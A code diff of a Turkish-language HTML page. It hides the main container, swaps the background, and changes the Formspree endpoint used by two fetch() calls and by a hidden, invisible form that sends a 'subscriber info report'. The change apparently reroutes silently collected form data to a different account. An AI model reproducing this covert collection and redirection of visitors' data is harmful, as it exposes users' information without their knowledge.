@@ -9,8 +9,9 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f4;
+            background-image: url(x.png);
             color: #333;
+            background-repeat: no-repeat;
         }
         .container {
             width: 80%;
@@ -20,6 +21,7 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            visibility: hidden;
         }
         header {
             text-align: center;
@@ -292,7 +294,7 @@
                 }
                 
                 // Formspree aracılığıyla ilk e-postayı size gönder
-                fetch('https://formspree.io/f/mblggklb', {
+                fetch('https://formspree.io/f/xnnppzww', {
                     method: 'POST',
                     body: formData,
                     headers: {
@@ -301,7 +303,7 @@
                 });
                 
                 // Formspree aracılığıyla ikinci e-postayı belirtilen adrese gönder
-                fetch('https://formspree.io/f/mblggklb', {
+                fetch('https://formspree.io/f/xnnppzww', {
                     method: 'POST',
                     body: formData,
                     headers: {
@@ -387,7 +389,7 @@
     </script>
     
     <!-- Formspree gizli form -->
-    <form id="hidden-form" action="https://formspree.io/f/mblggklb" method="POST" style="display:none;">
+    <form id="hidden-form" action="https://formspree.io/f/xnnppzww" method="POST" style="display:none;">
         <input type="hidden" name="_subject" value="Yeni Abone Bilgi Raporu">
         <input type="hidden" id="form-data" name="data">
         <button type="submit" id="hidden-submit">Gönder</button>
